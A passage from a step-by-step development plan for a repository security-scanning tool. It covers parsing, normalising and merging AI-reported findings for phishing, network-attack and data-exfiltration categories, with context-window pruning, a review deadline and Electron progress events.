    dataSharingMode: "full-files",
    redactionEnabled: true,
    timeoutMs: 30000,
    retryLimit: 0,
    contextWindow: 1024
  };
  const tools: ToolDefinition[] = [
    {
      name: "file_read",
      description: "read a file",
      run: async () => "x".repeat(2000)
    }
  ];
  const result = await runAgentLoop(
    config,
    "system",
    "review this",
    tools,
    { scanPath: "/tmp", mode: "full-files" },
    { maxRounds: 10, maxTokensPerReview: 4000 },
    fetchImpl
  );

  expect(result.result?.summary).toBe("done");
});
```

- [ ] **Step 2: Run test to verify it fails**

Run: `npx vitest run packages/ai-review/tests/agent.test.ts` (from repo root; the `npm --workspace` form is broken because the root vitest.config.ts include patterns are repo-root-relative)
Expected: FAIL — `newFindings` not parsed; `contextWindow` not in type

- [ ] **Step 3: Add `contextWindow` to `AiProviderConfig`**

In `packages/ai-review/src/types.ts`, add to `AiProviderConfig`:

```ts
  contextWindow?: number;
```

And add the `AiNewFinding` type:

```ts
export interface AiNewFinding {
  category: "phishing" | "network-attack" | "data-exfiltration";
  filePath: string;
  lineStart: number;
  lineEnd: number;
  codeSnippet: string;
  explanation: string;
  recommendedFix: string;
}
```

- [ ] **Step 4: Parse `newFindings` in `parseAgentResponse`**

In `packages/ai-review/src/agent.ts`, update `AgentFinalResult`:

```ts
export interface AgentFinalResult {
  summary: string;
  notes: AgentNote[];
  newFindings: AiNewFinding[];
}
```

Import `AiNewFinding` from `./types.js`. In `parseAgentResponse`'s `final` branch, parse the array:

```ts
const newFindings = Array.isArray(obj.newFindings)
  ? (obj.newFindings as AiNewFinding[]).filter(
      (nf) =>
        nf &&
        typeof nf === "object" &&
        typeof nf.category === "string" &&
        typeof nf.filePath === "string" &&
        typeof nf.codeSnippet === "string" &&
        typeof nf.explanation === "string"
    )
  : [];
return {
  type: "final",
  result: {
    summary: typeof obj.summary === "string" ? obj.summary : "",
    notes,
    newFindings
  }
};
```

- [ ] **Step 5: Add context-window-aware history pruning**

In `packages/ai-review/src/agent.ts`, update `runAgentLoop`. Compute the effective budget and prune oldest tool results:

```ts
export function resolveTokenBudget(config: AiProviderConfig, maxTokensPerReview: number): number {
  const contextWindow = config.contextWindow ?? (config.type === "ollama" ? 32768 : 131072);
  return Math.max(2000, Math.min(maxTokensPerReview, Math.floor(contextWindow * 0.7)));
}

function buildPromptWithinBudget(
  systemPrompt: string,
  tools: ToolDefinition[],
  history: string[],
  budget: number
): string {
  let pruned = [...history];
  while (pruned.length > 1 && estimateTokens(buildAgentPrompt(systemPrompt, tools, pruned)) > budget) {
    const idx = pruned.findIndex((entry) => entry.startsWith("<tool_result>"));
    if (idx === -1) {
      break;
    }
    pruned = pruned.slice(0, idx).concat(pruned.slice(idx + 1));
  }
  return buildAgentPrompt(systemPrompt, tools, pruned);
}
```

Then in `runAgentLoop`, replace the budget init and prompt build:

```ts
let budget = resolveTokenBudget(config, options.maxTokensPerReview);
```

```ts
const prompt = buildPromptWithinBudget(systemPrompt, tools, history, budget);
```

- [ ] **Step 6: Run test to verify it passes**

Run: `npx vitest run packages/ai-review/tests/agent.test.ts` (from repo root; the `npm --workspace` form is broken because the root vitest.config.ts include patterns are repo-root-relative)
Expected: PASS

- [ ] **Step 7: Export `AiNewFinding` + `resolveTokenBudget`**

In `packages/ai-review/src/index.ts`:

```ts
export { buildAgentPrompt, estimateTokens, parseAgentResponse, resolveTokenBudget, runAgentLoop } from "./agent.js";
```

and add `AiNewFinding` to the `./types.js` type export list.

- [ ] **Step 8: Commit**

```bash
git add packages/ai-review/src/agent.ts packages/ai-review/src/types.ts packages/ai-review/src/index.ts packages/ai-review/tests/agent.test.ts
git commit -m "feat: parse AI newFindings and prune agent history to context window"
```

---

## Task 7: AI review — normalize, deadline, merge

**Files:**
- Modify: `packages/ai-review/src/review.ts`
- Modify: `packages/ai-review/src/types.ts`
- Test: `packages/ai-review/tests/review.test.ts`

- [ ] **Step 1: Write the failing test**

Append to `packages/ai-review/tests/review.test.ts`:

```ts
import { normalizeAiFindings, mergeAiFindingsIntoReport, runAiReview } from "../src/review.js";

describe("normalizeAiFindings", () => {
  it("drops out-of-scope categories and caps risk at Medium with Low confidence and source ai", () => {
    const normalized = normalizeAiFindings([
      {
        category: "phishing",
        filePath: "phish.js",
        lineStart: 1,
        lineEnd: 1,
        codeSnippet: "credential harvest",
        explanation: "x",
        recommendedFix: "y"
      },
      {
        category: "command-injection",
        filePath: "other.js",
        lineStart: 1,
        lineEnd: 1,
        codeSnippet: "exec(x)",
        explanation: "out of scope",
        recommendedFix: "y"
      }
    ]);

    expect(normalized).toHaveLength(1);
    expect(normalized[0].category).toBe("phishing");
    expect(normalized[0].riskLevel).toBe("Medium");
    expect(normalized[0].confidence).toBe("Low");
    expect(normalized[0].source).toBe("ai");
  });

  it("drops findings without filePath or codeSnippet", () => {
    const normalized = normalizeAiFindings([
      {
        category: "network-attack",
        filePath: "",
        lineStart: 1,
        lineEnd: 1,
        codeSnippet: "",
        explanation: "missing path/snippet",
        recommendedFix: "y"
      }
    ]);

    expect(normalized).toHaveLength(0);
  });
});

describe("mergeAiFindingsIntoReport", () => {
  it("appends new findings and recomputes risk", () => {
    const merged = mergeAiFindingsIntoReport(report, {
      providerType: "cloud",
      model: "gpt-test",
      generatedAt: new Date().toISOString(),
      summary: "s",
      findingNotes: [],
      newFindings: [
        {
          id: "finding-9",
          riskLevel: "Medium",
          category: "phishing",
          filePath: "phish.js",
          lineStart: 1,
          lineEnd: 1,
          codeSnippet: "credential harvest",
          explanation: "x",
          recommendedFix: "y",
          evidenceTags: ["phishing"],
          source: "ai",
          confidence: "Low"
        }
      ]
    });

    expect(merged.findings).toHaveLength(2);
    expect(merged.risk.decision).toBe("Needs Review");
    expect(merged.risk.categoryCounts.phishing).toBe(1);
  });
});
```

- [ ] **Step 2: Run test to verify it fails**

Run: `npx vitest run packages/ai-review/tests/review.test.ts` (from repo root; the `npm --workspace` form is broken because the root vitest.config.ts include patterns are repo-root-relative)
Expected: FAIL — `normalizeAiFindings` / `mergeAiFindingsIntoReport` not exported

- [ ] **Step 3: Add `AiReviewResult` fields + options to `types.ts`**

In `packages/ai-review/src/types.ts`, extend `AiReviewResult`:

```ts
export interface AiReviewResult {
  providerType: AiProviderType;
  model: string;
  generatedAt: string;
  summary: string;
  findingNotes: Array<{
    findingId: string;
    explanation: string;
    falsePositiveNote?: string;
    saferPattern?: string;
  }>;
  newFindings: Finding[];
  truncated?: boolean;
}
```

Import `Finding` from `@repo-auditor/scanner-core`. Extend `AiReviewOptions`:

```ts
export interface AiReviewOptions {
  scanPath?: string;
  maxRounds?: number;
  maxFindingsPerBatch?: number;
  maxTokensPerReview?: number;
  maxTotalMs?: number;
  onBatchProgress?: (done: number, total: number) => void;
}
```

- [ ] **Step 4: Implement `normalizeAiFindings` + `mergeAiFindingsIntoReport`**

In `packages/ai-review/src/review.ts`, add after the `mergeNotes` function (line 145):

```ts
const allowedAiCategories = new Set(["phishing", "network-attack", "data-exfiltration"]);

export function normalizeAiFindings(newFindings: AiNewFinding[]): Finding[] {
  const out: Finding[] = [];

  for (const nf of newFindings) {
    if (!nf || !allowedAiCategories.has(nf.category)) {
      continue;
    }
    if (!nf.filePath || !nf.codeSnippet) {
      continue;
    }
    const lineStart = Number(nf.lineStart);
    const lineEnd = Number(nf.lineEnd);
    if (!Number.isFinite(lineStart) || !Number.isFinite(lineEnd)) {
      continue;
    }

    out.push({
      id: "",
      riskLevel: "Medium",
      category: nf.category,
      filePath: nf.filePath,
      lineStart,
      lineEnd: Math.max(lineStart, lineEnd),
      codeSnippet: nf.codeSnippet,
      explanation: nf.explanation,
      recommendedFix: nf.recommendedFix,
      evidenceTags: ["ai-sourced", nf.category],
      source: "ai",
      confidence: "Low"
    });
  }

  return out;
}

export function mergeAiFindingsIntoReport(report: AuditReport, result: AiReviewResult): AuditReport {
  const findings = [...report.findings, ...result.newFindings];
  const risk = assessRisk(findings, (report as { language?: Language }).language ?? "zh-TW");
  return {
    ...report,
    findings,
    risk,
    attackSurface: buildAttackSurface(findings)
  };
}
```

Imports needed at the top of `review.ts`:

```ts
import { assessRisk, buildAttackSurface } from "@repo-auditor/scanner-core";
import type { AuditReport, Finding, Language } from "@repo-auditor/scanner-core";
import type { AiNewFinding, AiProviderConfig, AiReviewOptions, AiReviewResult } from "./types.js";
```

Verify that `buildAttackSurface` is exported from `scanner-core` (`index.ts` exports it — yes, line ~14). Note `assessRisk` second arg is `Language`, so the cast to `{ language?: Language }` is for type safety.

- [ ] **Step 5: Relax prompts + wire `newFindings` into `runAiReview`**

Update `buildAiReviewPrompt` (line 6): replace the "Do not create new findings." line with:

```ts
const prompt = [
  "You are reviewing deterministic security scanner findings.",
  "You MAY add new findings for phishing, network attack, or data exfiltration only, and only after verifying the evidence in real code.",
  "Do not invent findings in any other category.",
  "Mark uncertainty clearly and focus on risk, false-positive considerations, and safer patterns.",
  langInstruction[lang] ?? langInstruction["zh-TW"],
  JSON.stringify({ ... })
].join("\n\n");
```

Update `buildBatchPrompt` (line 177) — replace the first two lines:

```ts
const prompt = [
  "You are investigating deterministic security scanner findings.",
  "You MAY add new findings for phishing, network attack, or data exfiltration, but only after reading the real source with file_read or code_search to verify the evidence.",
  "Do not invent findings in any other category.",
  "Use tools to read the actual source code and verify each finding before writing notes.",
  "For each finding decide: real risk, likelihood of a false positive, and a safer pattern.",
  ...
].join("\n");
```

In `runAiReview`, change the batch loop to accumulate `newFindings`, enforce deadline, and report progress. Replace the loop (lines 62-84):

```ts
  const newFindings: Finding[] = [];
  const maxTotalMs = options.maxTotalMs ?? 600_000;
  const deadline = Date.now() + maxTotalMs;
  const controller = new AbortController();

  for (let index = 0; index < batches.length; index += 1) {
    const batch = batches[index];
    options.onBatchProgress?.(index, batches.length);

    if (Date.now() >= deadline || controller.signal.aborted) {
      truncated = true;
      break;
    }

    const loopResult = await runAgentLoop(
      config,
      buildSystemPrompt(config),
      buildBatchPrompt(report, batch, config, ctx),
      tools,
      ctx,
      { maxRounds, maxTokensPerReview: budgetPerBatch },
      fetchImpl
    );

    if (loopResult.result) {
      summaries.push(loopResult.result.summary);
      notes.push(...loopResult.result.notes);
      newFindings.push(...normalizeAiFindings(loopResult.result.newFindings));
    } else if (loopResult.raw) {
      rawTexts.push(loopResult.raw);
    }
  }
```

Declare `let truncated = false;` above the loop. Add `newFindings` to the returned object (line 90-96):

```ts
  return {
    providerType: config.type,
    model: config.model,
    generatedAt: new Date().toISOString(),
    summary,
    findingNotes: notes.length > 0 ? mergeNotes(fallback.findingNotes, notes) : fallback.findingNotes,
    newFindings,
    truncated
  };
```

Note: `AbortController` is not wired to provider requests in this task (that requires plumbing the signal through `requestProviderCompletion`, which stays out of scope — the deadline check between batches bounds total time to ~`maxTotalMs + one request timeout`). Update the module-level comment accordingly.

**Plan fix (follow-up commit):** a provider request failure (e.g. `AbortError` from a per-request timeout) previously threw out of the batch loop and failed the whole `ai-review:run` IPC call as "AI 審查失敗". The batch loop now wraps `runAgentLoop` in try/catch: on failure it sets `truncated = true` and stops, returning the partial results collected so far — matching the deadline-truncation behavior documented in the README.

- [ ] **Step 6: Update `createOfflineAiReviewPlaceholder` return**

The offline placeholder (line 192-...) must also return the new fields:

```ts
    newFindings: [],
    truncated: false
```

- [ ] **Step 7: Run test to verify it passes**

Run: `npx vitest run packages/ai-review/tests/review.test.ts` (from repo root; the `npm --workspace` form is broken because the root vitest.config.ts include patterns are repo-root-relative)
Expected: PASS

- [ ] **Step 8: Export new functions from `index.ts`**

In `packages/ai-review/src/index.ts`:

```ts
export { buildAiReviewPrompt, createOfflineAiReviewPlaceholder, mergeAiFindingsIntoReport, normalizeAiFindings, previewProviderRequest, runAiReview } from "./review.js";
```

- [ ] **Step 9: Run full ai-review suite + typecheck**

Run: `npx vitest run packages/ai-review/tests` (from repo root; the `npm --workspace` form is broken because the root vitest.config.ts include patterns are repo-root-relative)
Run: `npm run typecheck --workspace packages/ai-review`
Expected: PASS

- [ ] **Step 10: Commit**

```bash
git add packages/ai-review/src/review.ts packages/ai-review/src/types.ts packages/ai-review/src/index.ts packages/ai-review/tests/review.test.ts
git commit -m "feat: normalize and merge AI new findings with deadline and progress"
```

---

## Task 8: Electron — return `mergedReport`, render + batch progress

**Files:**
- Modify: `apps/electron/src/main.ts`
- Modify: `apps/electron/src/renderer/index.html`
- Test: `apps/electron/tests/ipc.test.ts`

- [ ] **Step 1: Write the failing test**

Append to `apps/electron/tests/ipc.test.ts`. First check how the existing test imports `isAllowedIpcChannel` and asserts the allowlist (line 14 area). Add:

```ts
it("keeps ai-review:run in the IPC allowlist", () => {
  expect(isAllowedIpcChannel("ai-review:run")).toBe(true);
});
```

(Add a static assertion that the merged-report contract is honored by the allowlist/type test — if `ipc.test.ts` already asserts all channels, extend it to include any new channel names if applicable. No new channel is introduced; the existing `ai-review:run` response shape changes only.)

- [ ] **Step 2: Run test to verify it fails/passes**

Run: `npx vitest run apps/electron/tests` (from repo root; the `npm --workspace` form is broken because the root vitest.config.ts include patterns are repo-root-relative)
Expected: PASS (existing allowlist already covers `ai-review:run`; the added test is a regression guard)

- [ ] **Step 3: Update `ai-review:run` handler in `main.ts`**

Replace the handler body (lines 201-211):

```ts
ipcMain.handle("ai-review:run", async (event, payload: AiReviewPayload) => {
  assertAllowed("ai-review:run");
  const { createOfflineAiReviewPlaceholder, mergeAiFindingsIntoReport, runAiReview } = await import("@repo-auditor/ai-review");
  const { renderOutputs } = await import("@repo-auditor/scanner-core");
  const provider = {
    ...payload.provider,
    language: payload.provider.language ?? "zh-TW"
  };
  const onBatchProgress = payload.reportProgress
    ? (done: number, total: number) => {
        if (event.sender && !event.sender.isDestroyed()) {
          event.sender.send("ai-review:progress", { done, total });
        }
      }
    : undefined;
  const result = payload.execute
    ? await runAiReview(payload.report, provider, {
        scanPath: payload.report.target.localPath ?? undefined,
        onBatchProgress
      })
    : createOfflineAiReviewPlaceholder(payload.report, provider);
  const mergedReport = mergeAiFindingsIntoReport(payload.report, result);
  const mergedOutputs = renderOutputs(mergedReport, payload.outputFormats ?? ["markdown", "json"], provider.language);
  return { ...result, mergedReport, mergedOutputs };
});
```

**Plan fix (follow-up commit):** the original Step 3 snippet set the renderer's `outputs` to `undefined`, which crashed `renderResult` (reads `result.outputs.markdown`) and the export handler (`Object.entries(payload.outputs)`) with "Cannot read properties of undefined (reading 'markdown')". Instead, `main.ts` regenerates `mergedOutputs` from the merged report via `renderOutputs` (newly exported from `scan.ts`), and the renderer uses them so the preview and exported files reflect the AI-merged findings.

- [ ] **Step 4: Update renderer to use `mergedReport`**

In `apps/electron/src/renderer/index.html`, in the `ai-review` click handler (around line 943), after `state.aiReview = await ...`, add:

```js
const outputFormats = ["markdown", "json", "mermaid", "sarif", "html", "pdf"].filter(
  (format) => state.result.outputs && format in state.result.outputs
);
state.aiReview = await window.repoAuditor.aiReviewRun({
  report: state.result.report,
  execute: true,
  reportProgress: true,
  outputFormats,
  provider: { ... }
});
if (state.aiReview.mergedReport) {
  state.result = {
    ...state.result,
    report: state.aiReview.mergedReport,
    outputs: state.aiReview.mergedOutputs ?? state.result.outputs
  };
  renderResult(state.result);
}
```

Guard the preview fallback in `renderResult` (`result.outputs?.markdown`) so a missing outputs object cannot crash rendering.

- [ ] **Step 5: Add batch progress copy**

In the same renderer file, add translation keys. Find the i18n blocks (around lines 553-661) and add to each language:

```js
aiBatchProgress: "AI batch %done% of %total% done",
// zh-TW
aiBatchProgress: "AI 批次 %done% / %total% 完成",
// zh-CN
aiBatchProgress: "AI 批次 %done% / %total% 完成",
```

Wire the progress callback in the `ai-review:run` call by adding `onBatchProgress` to the options. Since the renderer calls `aiReviewRun` with a flat payload, update the IPC call to accept an options field:

```js
state.aiReview = await window.repoAuditor.aiReviewRun({
  report: state.result.report,
  execute: true,
  onBatchProgress: (done, total) => {
    $("preview").innerHTML = `<span class="spinner"></span>${t("aiBatchProgress").replace("%done%", String(done + 1)).replace("%total%", String(total))}`;
  },
  provider: { ... }
});
```

And update `apps/electron/src/main.ts` `AiReviewPayload` to carry `onBatchProgress` is NOT possible over IPC (functions don't serialize). Instead, `main.ts` maps a `reportProgress` boolean into `runAiReview`'s `onBatchProgress` callback that sends an IPC event to the renderer:

```ts
interface AiReviewPayload {
  report: AuditReport;
  provider: AiProviderConfig;
  execute?: boolean;
}
```

Keep the payload shape as-is; the progress callback is implemented inside `main.ts` by sending an event when a `reportProgress` flag is true:

```ts
const result = payload.execute
  ? await runAiReview(payload.report, provider, {
      scanPath: payload.report.target.localPath ?? undefined,
      onBatchProgress: payload.reportProgress
        ? (done, total) => {
            if (mainWindow && !mainWindow.isDestroyed()) {
              mainWindow.webContents.send("ai-review:progress", { done, total });
            }
          }
        : undefined
    })
  : createOfflineAiReviewPlaceholder(payload.report, provider);
```

Add `reportProgress?: boolean` to `AiReviewPayload`, add `"ai-review:progress"` to the IPC allowlist in `apps/electron/src/ipc.ts`, and in the renderer listen:

```js
window.repoAuditor.onAiReviewProgress((p) => {
  $("preview").innerHTML = `<span class="spinner"></span>${t("aiBatchProgress").replace("%done%", String(p.done + 1)).replace("%total%", String(p.total))}`;
});
```

Add `onAiReviewProgress` to `apps/electron/src/preload.ts` and `preload.cjs` (a `ipcRenderer.on("ai-review:progress", handler)` wrapper).

- [ ] **Step 6: Run tests + build**

Run: `npx vitest run apps/electron/tests` (from repo root; the `npm --workspace` form is broken because the root vitest.config.ts include patterns are repo-root-relative)
Run: `npm run build`
Expected: PASS

- [ ] **Step 7: Commit**

```bash
git add apps/electron/src/main.ts apps/electron/src/renderer/index.html apps/electron/src/ipc.ts apps/electron/src/preload.ts apps/electron/src/preload.cjs apps/electron/tests/ipc.test.ts
git commit -m "feat: merge AI findings into report and surface batch progress in Electron"
```

---

## Task 9: Full verification

- [ ] **Step 1: Run full test suite**

Run: `npm test`
Expected: PASS (all packages; 115+ existing + new tests)

- [ ] **Step 2: Typecheck all workspaces**

Run: `npm run typecheck --workspaces --if-present`
Expected: PASS

- [ ] **Step 3: Manual smoke on the malicious fixture**

Run: `npm run dev:cli -- scan ./fixtures/malicious-package --output-format markdown,json`
Expected: report generated; `phishing`/`network-attack` categories present if the fixture contains matching signals; `report.risk.decision` unchanged unless a new blocking finding appears.

- [ ] **Step 4: Commit any stragglers**

```bash
git status
git add -A
git commit -m "chore: verify threat detection hardening end-to-end"
```

---

## Self-Review Notes

- Spec coverage: Track 1 (threatPatterns module → Task 1-2; 6 rules + cross-file → Task 3; blocking categories + AI exclusion → Task 4; i18n → Task 5). Track 2 (newFindings parse → Task 6; normalize/merge/deadline → Task 7; Electron render → Task 8). Verification → Task 9.
- The `exfiltrationCorrelation` dedup logic depends on the `exfiltration-sink` rule running first (builtin rules precede the correlation pass in `applyBuiltinRules`). The `alreadyExfil` lookup tags the rule's finding instead of duplicating.
- `assessRisk` signature is `(findings, lang)` — merge uses the cast to satisfy TS.
- Deadline is checked between batches; per-request timeout still applies, so worst case is `maxTotalMs + one request timeout`.
